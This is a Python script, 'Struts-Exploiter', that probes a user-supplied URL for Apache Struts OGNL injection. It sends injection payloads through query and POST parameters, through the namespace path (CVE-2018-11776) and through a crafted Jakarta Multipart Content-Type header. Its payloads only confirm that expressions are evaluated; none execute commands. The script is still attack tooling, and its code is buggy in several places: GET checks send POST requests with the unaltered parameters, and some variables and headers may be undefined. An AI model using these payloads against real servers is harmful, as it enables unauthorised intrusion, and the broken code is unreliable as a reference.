#!/usr/bin/python3

import sys
import requests
import argparse
from urllib.parse import urlparse, parse_qs, quote, unquote
from http.cookies import SimpleCookie
import re
import copy

if len(sys.argv) <= 1:
    print('[*] Struts-Exploiter - gh0st27')
    print('\n%s -h for help.' % (sys.argv[0]))
    exit()

def get_parser():
    parser = argparse.ArgumentParser(prog='Struts-Exploiter.py', usage='Struts-Exploiter.py [options] --url "http://www.site.com/vuln.php?id=1"')
    parser.add_argument('-u', '--url',
                        dest="url",
                        help='Target URL (e.g."http://www.site.com/vuln.php?id=1")',
                        action='store'
                       )
    parser.add_argument('--data', dest='data',
                        help='Data string to be sent through POST (e.g. "id=1")', action='store'
                       )
    parser.add_argument('--cookies', dest='cookies',
                        help='HTTP cookies (eg. "jsessionid=1234")',action='store'
                       )
    parser.add_argument('-p', dest='testparam',
                       help='testable parameter',action='store'
                       )
    parser.add_argument('--proxy', dest='proxy', help='Use a proxy to connect to the target URL',
                        action='store'
                       )

    return parser


def do_Get(ttarget, dict_params, dict_cookies, proxies_listener, timeout, hheaders, verify, allow_redirects):
    print("in get function")
    try:
        output = b""
        with requests.post(ttarget, params=dict_params, cookies=dict_cookies, proxies=proxies_listener, timeout=timeout, headers=hheaders, verify=verify, allow_redirects=allow_redirects, stream=True) as response:
            for i in response.iter_content():
                output += i
    except requests.exceptions.RequestException as e:
        print(e)
    return output


def do_Post(ttarget, raw_data, dict_cookies, proxies_listener, timeout, hheaders, verify, allow_redirects):
    print("in post function")
    try:
        output = b""
        with requests.post(ttarget, data=raw_data, cookies=dict_cookies, proxies=proxies_listener, timeout=timeout, headers=hheaders, verify=verify, allow_redirects=allow_redirects, stream=True) as response:
            for i in response.iter_content():
                output += i
    except requests.exceptions.RequestException as e:
        print(e)
    return output


def main():
    print("in main function")
    parser = get_parser()
    args = vars(parser.parse_args())
    url, data, cookies, testparam, proxy = args['url'], args['data'],args['cookies'], args['testparam'], args['proxy']

    print(url, type(url))
    print(data, type(url))
    print(cookies, type(cookies))
    print(testparam, type(testparam))
    print(proxy, type(proxy))

    # parse url & query string
    parsed_url = urlparse(url)
    print(parsed_url, type(parsed_url))
    target_url = parsed_url.geturl()
    print("target url: " + target_url)
    query_param = parse_qs(parsed_url.query)
    print(query_param, type(query_param))

    #url for namespace vulnerability
    ns_target = parsed_url.scheme + "://" + parsed_url.netloc
    print("ns_taget is : ")
    print(ns_target)
    path = parsed_url.path

    #convert cookie into dictionay if present
    if cookies is not None:
        cookie = SimpleCookie()
        cookie.load(cookies)
        cookies = {}
        for key, morsel in cookie.items():
            cookies[key] = morsel.value
            print(cookies, type(cookies))
    else:
        cookies = None
        print("cookie value is None")

    #Setup proxy listener
    if proxy is not None and proxy != '':
        proxies = {
            'http': 'http://%s' % (proxy),
            'https': 'http://%s' % (proxy)
        }
    else:
        proxies = None

    #convert post data to dictionary if present
    if data is not None:
        data = data
    else:
        data = None

    #Request parameters
    target = parsed_url.geturl()
    timeout = 3
    headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36',
    'Content-Type': 'application/x-www-form-urlencoded'
    }
    allow_redirects = True
    verify = False
    dict_cookies = cookies
    proxies_listener = proxies
    dict_param = query_param
    raw_data = data

    print("----------------------")
    print(target)
    print(dict_cookies, type(dict_cookies))
 #   print("raw data is " + raw_data, type(raw_data))
 #   print("query string is: \n")
 #   print(dict_param, type(dict_param))

    #checking for ambigiuos request
    if raw_data is not None and bool(dict_param):
        print("iReqeust is ambigious.\n [*]Exiting......")
        exit()
    else:
        print("Reuest seems okay..")

    check(target, ns_target, path, raw_data, dict_param, timeout, headers, allow_redirects, verify, dict_cookies, proxies_listener)

def check(target, ns_target, path, raw_data, dict_param, timeout, headers, allow_redirects, verify, dict_cookies, proxies_listener):

    #OGNL Injection
    print("[*] checking for OGNL Injection")
    ttarget = copy.copy(target)
    hheaders = headers.copy()
    check_payload = ['ghost%{1336+1}', 'ghost${"zkzz".toString().replace("k", "z")}']
    if raw_data is not None:
        print("Performing OGNL injection on Post parameters.........")
        data_url_decoded = unquote(raw_data)
        print("url decoded data: " + data_url_decoded)
        data_list = re.split(r'[=&]{1}', data_url_decoded)
        print(raw_data, type(raw_data))
        print(data_list)
        for i in range(1, len(data_list), 2):
            for j in range(0, len(check_payload)):
                find = print(data_list[i])
                post_data = raw_data.replace(str(data_list[i]), quote(check_payload[j]), 1)
#                quoted_post_data = quote(post_data)
                print('checking post parameter " {} " for OGNL injectin using payload {}...'.format(str(data_list[i-1]), str(check_payload[j])))
                print('Post body params are: {}'.format(post_data))
                output = do_Post(ttarget, post_data, dict_cookies, proxies_listener, timeout, hheaders, verify, allow_redirects)
                match = re.search(r'ghost1337', str(output))
                match2 = re.search(r'ghostzzzz', str(output))
                if match:
                    print("[+] target seems vulnerable...Lets confirm it with different payload")
                elif match2:
                    print("[+] target is vulnerable to OGNL Injection")
                else:
                    print("[-] target is not vulnerable to OGNL Injection")

    else:
        print("performing oGNL injection on Query strings")
        for key in dict_param.keys():
            for j in range(0, len(check_payload)):
                temp = dict_param.copy()
                print(key)
                temp[key] = check_payload[j]
                print(temp)
                print('Checking Get parameter {} for OGNL Injection using payload {} ........'.format(key, str(check_payload[j])))
                output = do_Get(ttarget, dict_param, dict_cookies, proxies_listener, timeout, hheaders, verify, allow_redirects)
                match = re.search(r'ghost1337', str(output))
                match2 = re.search(r'ghostzzzz', str(output))
                if match:
                    print("[+] target seems vulnerable...Lets confirm it with differenet payload")
                elif match2:
                    print("[+] target is vulnerable to OGNL Injection")
                else:
                    print("[-] target not vulnerable to OGNL Injectin")
                temp.clear()

    #checking for namespace redirect cve-2018-11776
    if raw_data is not None:
#        print("Performing namespace redirect...sending post rquest")
        for j in range(0, len(check_payload)):
            print(target)
            del ttarget
            ttarget = ns_target + "/" + quote(check_payload[j]) + path
            print(ttarget)
            print('checking Namespace Redirect OGNL Injection using payload {}...'.format(str(check_payload[j])))
            print('Sending post request')
            output = do_Post(ttarget, post_data, dict_cookies, proxies_listener, timeout, hheaders, verify, allow_redirects)
            match = re.search(r'ghost1337', str(output))
            match2 = re.search(r'ghostzzzz', str(output))
            if match:
                print("[+] target seems vulnerable...Lets confirm it with different payload")
            elif match2:
                print("[+] target is vulnerable to Namespace Redirect OGNL Injection")
            else:
                print("[-] target is not vulnerable to Namespace Redirect OGNL Injection")

    else:
        print("Preforming Namespace Redirect OGNL Injection...sending GET request")
        for j in range(0, len(check_payload)):
            print(target)
            del ttarget
            ttarget = ns_target + "/" + quote(check_payload[j]) + path
            print(ttarget)
            print('checking Namespace Redirect OGNL Injection using payload {}...'.format(str(check_payload[j])))
            print('Sending GET request')
            output = do_Get(ttarget, dict_param, dict_cookies, proxies_listener, timeout, hheaders, verify, allow_redirects)
            match = re.search(r'ghost1337', str(output))
            match2 = re.search(r'ghostzzzz', str(output))
            if match:
                print("[+] target seems vulnerable...Lets confirm it with different payload")
            elif match2:
                print("[+] target is vulnerable to Namespace Redirect OGNL Injection")
            else:
                print("[-] target is not vulnerable to Namespace Redirect OGNL Injection")

    # Checking for Jakarta Multipart parser OGNL Injection - Content type header
    print(hheaders)
    multipart_payload = "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('strutsExploiter','gh0st27')}.multipart/form-data"
    hheaders['Content-Type'] = str(multipart_payload)
    print(hheaders)
    del ttarget
    ttarget = target
    if raw_data is not None:
        print("Sending Post Request")
        print('checking Jarkarta Multipart parser OGNL Injection on Content Type header using payload {} '.format(str(multipart_payload)))
        response = requests.post(ttarget, data=post_data, cookies=dict_cookies, proxies=proxies_listener, timeout=timeout, headers=hheaders, verify=verify, allow_redirects=False)
        o_header = response.headers['strutsExploiter']
        print(o_header)
        if o_header == 'gh0st27':
            print("[+] target is vulnerable to Jarkarta Multipart parser OGNL Injection on Content Type header")
        else:
            print("[-] target is not vulnerable to Jarkarta Multipart parser OGNL Injection on Content Type header")
    else:
        print("Sending GET Request")
        print('checking Jarkarta Multipart parser OGNL Injection on Content Type header using payload {} '.format(str(multipart_payload)))
        response = requests.get(ttarget, params=dict_param, cookies=dict_cookies, proxies=proxies_listener, timeout=timeout, headers=hheaders, verify=verify, allow_redirects=False)
        o_header = response.headers['strutsExploiter']
        print(o_header)
        if o_header == 'gh0st27':
            print("[+] target is vulnerable to Jarkarta Multipart parser OGNL Injection on Content Type header")
        else:
            print("[-] target is not vulnerable to Jarkarta Multipart parser OGNL Injection on Content Type header")
        hheaders.clear()

    # Checking for Jakarta Multipart parser OGNL Injection - Content disposition header

if __name__ =='__main__':
    try:
        main()
    except KeyboardInterrupt:
        print('\n[*]KeyboardInterrupt Detected.')
        print('[*]Exiting...')
        exit()
